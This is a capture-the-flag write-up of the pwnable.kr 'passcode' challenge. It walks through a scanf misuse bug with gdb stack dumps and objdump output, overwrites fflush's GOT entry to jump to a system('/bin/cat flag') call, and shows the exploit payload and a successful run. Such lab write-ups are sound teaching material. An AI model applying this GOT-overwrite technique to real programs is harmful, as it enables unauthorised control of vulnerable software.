# pwnable.kr: passcode

After logging in, we do a ```ls``` and observe the below files
```
$ ls
flag  passcode	passcode.c
$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
```

Passcode flow is as follows
1. Prompt for user input of name, up to 100 characters, store it in the stack and say hi to us
2. The method ```login``` then prompt for 2 integer, however, the storing of the user input to the variables are incorrect
3. Then it checks passcode1==338150 and passcode2==13371337
4. If the check succeeds, it prints out the flag for us

We try to compile the program and observe the warning raised due to the incorrect paramters of ```passcode1``` instead of ```&passcode1```. Instead of passing the address of passcode1, the actual value of passcode1 is passed, hence the user input for scanf will not be written correctly.
```
$ gcc -o passcode passcode.c
passcode.c: In function ‘login’:
passcode.c:9:2: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat]
passcode.c:14:9: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat]
```

Let's try running the program, and it crashes. This may be because when the actual value of passcode2 is passed(instead of the address of passcode2), it does not reflect an actual address :(
```
$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : hi
Welcome hi!
enter passcode1 : 338150
enter passcode2 : 13371337
Segmentation fault (core dumped)
```

We compile the program with some println to observe the address of the variables
```
void login(){
	...
	printf("address of passcode1: %p\n", &passcode1);
	printf("address of passcode2: %p\n", &passcode2);
	...
}

void welcome(){
	...
	printf("address of name: %p\n", &name);
}
```
In console
```
address of name: 0xbffff2f8
address of passcode1: 0xbffff358
address of passcode2: 0xbffff35c
```
Or with gdb, we get the following (-0x30)
```
address of name: 0xbffff2c8
address of passcode1: 0xbffff328
address of passcode2: 0xbffff32c
```

Okay, we compile the original version of it and run with gdb, with an input of 100 'a' as name
```
$ gdb passcode
(gdb) break login
Breakpoint 1 at 0x804856a
(gdb) break welcome
Breakpoint 2 at 0x8048627
(gdb) run
Starting program: /home/user/Desktop/passcode 
Toddler's Secure Login System 1.0 beta.

Breakpoint 2, 0x08048627 in welcome ()
(gdb) next
Single stepping until exit from function welcome,
which has no line number information.
enter you name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
0x08048694 in main ()
(gdb) x/50x 0xbffff2c0
0xbffff2c0:	0xb7fc7a20	0x08048814	0x61616161	0x61616161
0xbffff2d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff2e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff2f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff300:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff310:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff320:	0x61616161	0x61616161	0x61616161	0xff256000
0xbffff330:	0x00000000	0x00000000	0xbffff358	0x08048694
0xbffff340:	0x08048814	0x00000000	0x080486b9	0xb7fc6ff4
0xbffff350:	0x080486b0	0x00000000	0x00000000	0xb7e394e3
0xbffff360:	0x00000001	0xbffff3f4	0xbffff3fc	0xb7fdc858
0xbffff370:	0x00000000	0xbffff31c	0xbffff3fc	0x00000000
0xbffff380:	0x08048290	0xb7fc6ff4
```
In the above, we observe our string of 'a', but we also notice that the last four set of 'a' eats into the passcode1 at 0xbffff328.

These four set of 'a' persist till the reading in of passcode as shown below. This means we could pass in an address of our choosing in name, and use the scanf for passcode1, to write a value to our chosen address.
```
(gdb) next
Single stepping until exit from function main,
which has no line number information.

Breakpoint 1, 0x0804856a in login ()
(gdb) next
Single stepping until exit from function login,
which has no line number information.
enter passcode1 : 3221222136

Program received signal SIGSEGV, Segmentation fault.
0xb7e6fda3 in _IO_vfscanf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/50x 0xbffff2c0
0xbffff2c0:	0xb7fc7a20	0xbffff314	0xb7e6d021	0xb7fc6ff4
0xbffff2d0:	0xb7fc7ac0	0xb7fc88c4	0xb7e1f900	0xb7e766eb
0xbffff2e0:	0xb7fc7ac0	0x08048793	0xbffff314	0x00000000
0xbffff2f0:	0xb7fc7a20	0x08048780	0xbffff314	0xb7fc6ff4
0xbffff300:	0x00000000	0x00000000	0xbffff338	0x0804858b
0xbffff310:	0x08048793	0x61616161	0x61616161	0x61616161
0xbffff320:	0x61616161	0x61616161	0x61616161	0xff256000
0xbffff330:	0x00000000	0x00000000	0xbffff358	0x08048699
0xbffff340:	0x08048814	0x00000000	0x080486b9	0xb7fc6ff4
0xbffff350:	0x080486b0	0x00000000	0x00000000	0xb7e394e3
0xbffff360:	0x00000001	0xbffff3f4	0xbffff3fc	0xb7fdc858
0xbffff370:	0x00000000	0xbffff31c	0xbffff3fc	0x00000000
0xbffff380:	0x08048290	0xb7fc6ff4
```

Looking at passcode.c, the function that follows after ```scanf("%d", passcode1);``` is a ```fflush```, an instruction that we can possibly overwrite. And to get the flag, we probably want to execute the line that ```system("/bin/cat flag");```

The address of ```fflush``` is 0x0804a004 on the server
```
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

The address of the line we want to jump to is 0x80485e3
```
Breakpoint 1, 0x0804856a in login ()
(gdb) x/50i $eip
   ...
   0x80485e3 <login+127>:	movl   $0x80487af,(%esp)
   0x80485ea <login+134>:	call   0x8048460 <system@plt>
   ...
```

Plug these values into our pwn script and run
```
$ ./passcode.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Starting remote process './passcode' on pwnable.kr: pid 4060
name:  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x0
passcode1:  134514147
Toddler's Secure Login System 1.0 beta.

enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x0!

enter passcode1 : Sorry mom.. I got confused about scanf usage :(

Now I can safely trust you that you have credential :)
```